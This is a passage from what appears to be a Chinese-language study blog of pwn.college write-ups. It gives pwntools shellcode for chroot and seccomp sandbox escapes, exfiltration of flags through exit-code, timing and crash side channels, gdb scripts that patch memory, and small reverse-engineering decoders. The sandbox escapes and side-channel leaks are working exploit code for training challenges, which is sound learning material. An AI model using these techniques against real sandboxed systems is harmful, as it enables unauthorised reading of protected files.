class="hljs-built_in">open</span>(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="6-fchdir"><a href="#6-fchdir" class="headerlink" title="6.fchdir"></a>6.fchdir</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.fchdir(<span class="hljs-number">6</span>)                       <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="7-没有at了"><a href="#7-没有at了" class="headerlink" title="7.没有at了"></a>7.没有at了</h3><p>允许的syscall:</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">chdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">80</span>).<br>chroot (<span class="hljs-keyword">number</span> <span class="hljs-number">161</span>).<br><span class="hljs-built_in">mkdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">83</span>).<br><span class="hljs-keyword">open</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">2</span>).<br><span class="hljs-keyword">read</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">0</span>).<br><span class="hljs-keyword">write</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">1</span>).<br>sendfile (<span class="hljs-keyword">number</span> <span class="hljs-number">40</span>).<br></code></pre></div></td></tr></table></figure><p>使用再次chroot:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.mkdir(<span class="hljs-string">&quot;/temp&quot;</span>, <span class="hljs-number">0o777</span>)<br>shellcode+= shellcraft.amd64.chroot(<span class="hljs-string">&quot;/temp&quot;</span>)             <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../../flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="8-openat-read-write-send"><a href="#8-openat-read-write-send" class="headerlink" title="8.openat read write send"></a>8.openat read write send</h3><p>感觉没什么特别的. 参数已经不限制输入flag了. 直接使用第三题的东西.</p><h3 id="9-变成32位"><a href="#9-变成32位" class="headerlink" title="9.变成32位"></a>9.变成32位</h3><p>syscall no: 3,4,5,6: <strong>close, stat, fstat, lstat.</strong> ???????????</p><p>哦对, 程序里的seccomp是通过SCMP_SYS() macro来add rule的, 然后又把arch设置成x86_32, 这样的话就是32位的read write open close这四个系统调用了. 而且没有chroot.</p><p>尝试使用pwntools遇到各种各样的问题.</p><ul><li>64和32代码是怎么切换的? int 0x80 and syscall吗? 是的, 22年10月知道了. </li><li>int 0x80在64位模式下汇编, push最多DWORD. 不然operand mismatch.</li><li>字符串的地址只能使用汇编中的label, 栈上的地址仍然是64位的, 可能是因为过长导致open不能使用.</li><li>64位汇编肯定就不能用SYS_read这种了, 只能改成数字. </li></ul><p>精简如下(也没多精简):</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">/* open(file=&#x27;/flag&#x27;, oflag=&#x27;O_RDWR&#x27;, mode=0) */<br>/* push b&#x27;/flag\x00&#x27; */<br>lea ebx, [rip+flag]<br>mov ecx, 0x2<br>xor edx, edx<br>/* call open() */<br>mov eax, 5<br>int 0x80<br>/* read(fd=&#x27;eax&#x27;, buf=0x1337100, nbytes=0x99) */<br>mov ebx, eax<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call read() */                               <br>push 3/* 3 */<br>pop rax<br>int 0x80<br>/* write(fd=1, buf=0x1337100, n=0x32) */<br>mov ebx, 0x1<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call write() */<br>mov eax, 4<br>int 0x80<br><br>flag:<br>    .ascii &quot;/flag&quot;<br>    .byte 0 #加不加没有区别, map上去的地址空间都是零<br></code></pre></div></td></tr></table></figure><h3 id="10-side-channel-communication"><a href="#10-side-channel-communication" class="headerlink" title="10.side channel communication"></a>10.side channel communication</h3><blockquote><p>都没有chroot了. 这题使用exit每次返回一字节.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)<br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure><h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote><p>这下子真的是bitwise的收集数据了</p></blockquote><p>遇到的几个问题:</p><ul><li>偶然会发生broken tube, 不知原因.</li><li>可以用字符串的format函数. </li><li>在pwn.college机子上timespec结构体两个成员都是<strong>八字节(包括long)</strong> </li><li>被网上抄来的32位程序nasm坑了一把, 现在是64位gas, 基本全改了……….</li><li>setnz是思维导图里看到突然想起来能用的. 以前整得笔记还不错.</li><li>直接使用label地址会有重定位条目, 必须使用rip来加上标签的偏移来在运行时确定准确的地址.</li><li>加载地址请用lea……line 15卡了十几分钟…..</li><li>视频中演示了time命令, 计算程序运行时间.</li><li>也可以直接写在栈上, 不用在汇编里写上这么一个数据结构.</li><li>如果把时间范围调大一点也能用时间来表示ascii码值, 也就是一次一字节. 应该更快.</li><li>视频使用了一个pwn.log.progress和process参数level, 这样子就不会有一堆打开关闭命令了.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>bck1 = <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100\n&#x27;</span>+shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)+<span class="hljs-string">&#x27;xor rcx, rcx\n&#x27;</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    setnz cl</span><br><span class="hljs-string">    sal ecx, 4</span><br><span class="hljs-string">    mov [rip+tv_usec+3], cl</span><br><span class="hljs-string">    mov rax, 35</span><br><span class="hljs-string">    lea rdi, [rip+timeval]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //经典非法指令,至少让我知道shellcode执行正常</span><br><span class="hljs-string">    .ascii &quot;\x0f\x04&quot; </span><br><span class="hljs-string">    timeval:</span><br><span class="hljs-string">    tv_sec:  .8byte 0</span><br><span class="hljs-string">    tv_usec: .8byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    char = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc = bck1 <span class="hljs-comment">#这个就是对read的一个封装</span><br>        <span class="hljs-comment">#下面这个是取出一字节, 然后测试第j位是否为1</span><br>        sc += <span class="hljs-string">&#x27;mov cl, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\ntest cl,&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">1</span>&lt;&lt;j)+<span class="hljs-string">&#x27;\n&#x27;</span><br>        sc += bck2<br><span class="hljs-comment">#上面这个是nanosleep的调用封装,秒数由j位移位赋值到timespec结构体中第二个成员的第四个字节</span><br><span class="hljs-comment">#(从最低位开始, 因为是小端法存储),结果是268,435,456(1 0000|00000000|00000000|00000000)ns</span><br><span class="hljs-comment">#无sleep大概是0.05s,所以分界点为0.2s</span><br>        payload = asm(sc)<br>        start = time.time()<br>        p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>        p.sendline(payload)<br>        p.wait()<br>        end = time.time()<br>        elapse = end - start<br>        <span class="hljs-keyword">if</span> elapse &gt; <span class="hljs-number">0.2</span>:<br>            char |= <span class="hljs-number">1</span>&lt;&lt;j<br>    <span class="hljs-comment">#end for bits loop</span><br>    ans += <span class="hljs-built_in">chr</span>(char)<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure><h3 id="12-only-read"><a href="#12-only-read" class="headerlink" title="12.only read"></a>12.only read</h3><p>这次换成crash code就行了. <code>-4 </code>is <code>SIGILL</code>, <code>-11</code> is <code>SIGSEGV</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#一点小改动</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">jnz isZero</span><br><span class="hljs-string">.ascii &quot;\x0f\x04&quot;</span><br><span class="hljs-string">isZero: .byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> p.poll(<span class="hljs-number">1</span>) == -<span class="hljs-number">4</span>:<br>    char |= mask<br></code></pre></div></td></tr></table></figure><h3 id="13-怎么是socket"><a href="#13-怎么是socket" class="headerlink" title="13.怎么是socket??"></a>13.怎么是socket??</h3><blockquote><p>use socketpair to the local communication </p><p>感觉没有任何限制啊, 就是构造一点父子进程间特有的命令.</p></blockquote><p>开始gdb refresher!!!!!</p><h1 id="module-6-gdb"><a href="#module-6-gdb" class="headerlink" title="module 6-gdb"></a>module 6-gdb</h1><p>GDB时间!</p><ul><li>info有好多东西. 看到一个<code>i proc m(appings)</code>, 不就是我上次用的<code>! cat /proc/pid/maps</code>么.</li><li> 一份超好看的<a href="https://www.cs.umd.edu/class/spring2015/cmsc414/downloads/gdb-refcard.pdf">cheatsheet</a>!</li><li>pwndbg的<a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md">features</a> </li><li>神奇的教程网站, 视频是文字. <a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/">link</a> </li><li>三种gdb插件–gef(<a href="https://demo.gef.blah.cat/">demo网站</a>|<a href="https://gef.readthedocs.io/en/master/">doc</a>), 其他两个装好了. 还是peda安装简单, 还能整到pwncollege上. 再用一个插件我会混的….</li></ul><p>“Auto-loading safe path” section in the GDB manual.</p><p>前几题都没什么特别的, 就是一个refresher.</p><p>命令行选项: <code>/challenge/e* -x gdbscrip -q</code> </p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>居然要重复四次, 直接修改推导变量. 而且没有运行前加上断点会出错….原因待查.</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>开始编写gdb脚本. 没有尝试过的东西, 马上开学.</p><p>查看gdb manual, <code>5.1.7 Breakpoint Command Lists</code>有提到一种特别的写法:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">commands [list.<span class="hljs-string">..</span>]<br><span class="hljs-string">...</span> command-list <span class="hljs-string">...</span><br>end<br></code></pre></div></td></tr></table></figure><p>Any other command after a command that resumes execution will be ignored. </p><p>Can use <code>silent</code> to disable the printing of usual message when stopping at certain breakpoint. Usefull command for contolled output in <code>23.1.4 Commands for Controlled Output</code>, usually <code>echo, output, and printf</code> </p><p>You can also use breakpoint commands to compensate for one bug and test the other!</p><p><strong>e.g.</strong> </p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">break</span> foo <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span><br>commands<br>silent<br>printf <span class="hljs-string">&quot;x is %d\n&quot;</span>,x<br>cont<br>end<br></code></pre></div></td></tr></table></figure><p>好家伙, 每次地址都会变, 得换成相对地址. printf *($rbp-0x18)直接失败, 报attemp to dereferecing a generic pointer. 要想dereference指针得确定指针的类型, </p><p>先设断点然后再c(ontinue).</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">r                           <br>b *main+<span class="hljs-number">709</span><br>commands<br>    silent<br>    <span class="hljs-keyword">x</span>/gx $rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><br>    set *(int*)($rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>)<span class="hljs-operator">=</span><span class="hljs-number">7</span><br>    <span class="hljs-keyword">c</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">c</span><br></code></pre></div></td></tr></table></figure><p>真正自己写起来问题怎么这么多……</p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><ul><li><p>全自动scrip. 在手册中的<code>23.1.3 Command Files</code>有介绍一些flow control command. 然后<code>5.1.3 Setting Catchpoints</code>也挺重要.</p></li><li><p>This time, try to write a script that doesn’t require you to ever talk to the program, and instead automatically solves each challenge by correctly <strong>modifying registers / memory.</strong> </p></li><li><p><a href="https://www.mengyibai.com/p/gdb-print-variables/">GDB: Printing Variables to File</a>, 不太好用, 毕竟是logging文件.</p></li><li><p>使用<code>printf</code>命令来写raw bytes到文件中.</p></li><li><p><code>commands</code>命令可以为断点添加命令.</p></li><li><p><code>ddb</code> – interactive kernel debugger</p></li></ul><p>如果要全自动, 我想到的思路是在read /dev/urandom的时候改成从stdin获取, 然后再gdb中使用<code>r &lt; tmp</code>来重定向. 后面的scanf也是从stdin获取, 这样的话就好办了. 为了测试conditionally perform gdb commands, 就不更改循环变量了.</p><p>历经挫折: </p><ul><li><del>把文件作为输入而且要多次输入, 每次文件指针都会向后移动的…..所以还是改变内存吧……</del>事实证明没有问题, 不过如果只是简单地&gt;=3会导致flag无法打开. 所以加上<code>4&lt;tmp</code>, if条件换成<code>if $rdi &gt;= 3 &amp;&amp; $rdi != 0x44</code>即可. </li><li>这个程序每次都会重新打开/dev/uramdom, 或许是因为新的随机数要重新打开???这样文件指针会大于等于3……</li><li>catch syscall会在syscall之前和之后调用, 所以设置好if语句就行…. (calls to and returns from system calls will be caught.)</li><li>还把==写成=, 绝</li><li>还发现了一个, 第六行按理来说已经跳到别的函数了, 毕竟read也只是glibc的封装, 但没注意到的是<code>__GI___libc_read()</code>这个函数根本没有<code>push rbp</code>,  <strong>所以当前栈帧没有变化</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3 &amp;&amp; $rdi != 0x44)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure><p>一个level能挣这么多东西出来…….</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>直接一个<code>call (void*)win()</code>就结束了….</p><h1 id="module-7-rev"><a href="#module-7-rev" class="headerlink" title="module 7-rev"></a>module 7-rev</h1><ul><li>forword engineering vs. reverse engineering</li><li><code>cpp du strip strings</code> commands.</li><li>the most often we do is reversing the main modules.</li><li><code>fomit-frame-pointer</code> </li><li><a href="https://cloud.binary.ninja/u/yogdzewa">cloud ninja</a> 用这个或者直接IDA就行. 都有IDA pro了其他的就随便试试.反正视频里是不可能说用盗版的:laughing: </li><li>把另一个checksec链接成了secheck, 功能似乎更多一点.</li><li>Open source:<ul><li><strong>angr management:</strong> an academic binary analysis framework! (<a href="https://github.com/angr/angr-management/releases">github</a>) </li><li><strong>ghidra:</strong> a reversing tool created by the National Security Agency (<a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>) </li><li><strong>cutter:</strong> a reversing tool created by the radare2 open source project (<a href="https://cutter.re/">https://cutter.re/</a>) </li></ul></li><li>dynamic analysis: <ul><li>ltrace and strace </li><li>gdb<ul><li>context可以直接用display命令在每次停下来的时候模拟.</li></ul></li><li>Timeless Debugging<ul><li><strong>gdb</strong> has built-in record-replay functionality (<a href="https://sourceware.org/gdb/onlinedocs/gdb/Reverse-Execution.html#Reverse-Execution">doc</a>)</li><li><strong>rr</strong> is a highly-performant record-replay engine (<a href="https://github.com/mozilla/rr">github</a>) <a href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li><li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a href="https://qira.me/">https://qira.me/</a>) </li></ul></li></ul></li></ul><h3 id="level1-0-2-1"><a href="#level1-0-2-1" class="headerlink" title="level1.0-2.1"></a>level1.0-2.1</h3><p>没有什么特别, 但是2.1这个字符换位置的汇编值得注意:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movzx   eax, byte ptr [rbp+buf]<br>mov     byte ptr [rbp+var_10], al<br>movzx   eax, byte ptr [rbp+buf+1]<br>mov     byte ptr [rbp+var_10+1], al<br>movzx   eax, byte ptr [rbp+var_10+1]<br>mov     byte ptr [rbp+buf], al<br>movzx   eax, byte ptr [rbp+var_10]<br>mov     byte ptr [rbp+buf+1], al<br></code></pre></div></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>合着每关还有提示这关用了什么……</p><p>level3是reverse mangler.</p><h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h3><ul><li>IDA的汇编语法是使用的MASM(Microsoft Macro Assembler)的. <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-170">这里</a>是一些directive. </li><li>IDA使用的high-level IL是IDC, 一个C-like language. 像什么<code>LOBYTE</code>在手册中有</li><li>一个<code>char buf[6]</code>被识别成了<code>int buf + int16_t v6</code>, 改一下buf的定义就成.</li><li>看了看IDA的一些操作.</li></ul><p>由于<code>biltw</code>是按照字母顺序排列, 所以一通操作之后没有变化.</p><h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h3><blockquote><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb2</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">0xFA</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xF1</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x^<span class="hljs-number">0x98</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>])<br><br>[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>]<br></code></pre></div></td></tr></table></figure><p>好像简单过头了…</p><h3 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h3><blockquote><p>reverse + sort + xor</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8f 8e 8e 8e 8c 82 81 87 86 84 9f 9e 9e 9e 93&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br>list1 = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)^<span class="hljs-number">0xeb</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br>list1.reverse()<br>res = <span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list1])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></div></td></tr></table></figure><p>属于是python的练习使用</p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><blockquote><p>真特么复杂….还有<strong>不可见字符</strong>只能整成byte写到文件里.</p><p>好像挺简单, 但是又有点难(?</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ff ff fe fc fb fb fb f7 f6 f6 f1 e7 e6 e1 e1 3c 3a 3a 38 37 32 32 20 2c 25 22 21 32 20&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>]<br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#print(len(list))</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">list</span>[i] ^= <span class="hljs-number">0x95</span><br>    <span class="hljs-built_in">list</span>[i+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0x56</span><br><span class="hljs-built_in">list</span>[<span class="hljs-number">28</span>] ^= <span class="hljs-number">0x95</span> <span class="hljs-comment">#奇数个.....</span><br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>byte = <span class="hljs-string">b&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> x <span 